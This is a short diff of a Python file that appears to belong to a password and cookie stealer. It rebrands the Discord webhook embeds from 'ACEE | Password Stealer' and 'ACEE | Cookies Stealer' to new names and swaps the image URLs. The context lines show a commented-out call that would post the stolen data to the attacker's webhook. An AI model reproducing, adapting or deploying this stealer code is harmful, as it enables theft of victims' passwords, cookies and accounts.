@@ -137,15 +137,15 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "ACEE | Password Stealer"
+                "name": "UJKUSHIJAKUT | fb123"
             },
             "footer": {
-                "text": "@ACEE STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "@UJKU",
+                "icon_url": "https://cdn.discordapp.com/attachments/1051182391831564361/1052576783658123366/images.jpg"
             }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1051182391831564361/1052576783658123366/images.jpg",
         "attachments": []
         }
         # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -169,15 +169,15 @@ def upload(name, tk=''):
                 }
             ],
             "author": {
-                "name": "ACEE | Cookies Stealer"
+                "name": "UJKUSHIJAKUT | fb1234"
             },
             "footer": {
-                "text": "@ACEE STEALER",
-                "icon_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png"
+                "text": "@UJKU",
+                "icon_url": "https://cdn.discordapp.com/attachments/1051182391831564361/1052576783658123366/images.jpg"
             }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/963114349877162004/992245751247806515/unknown.png",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1051182391831564361/1052576783658123366/images.jpg",
         "attachments": []
         }
         # urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
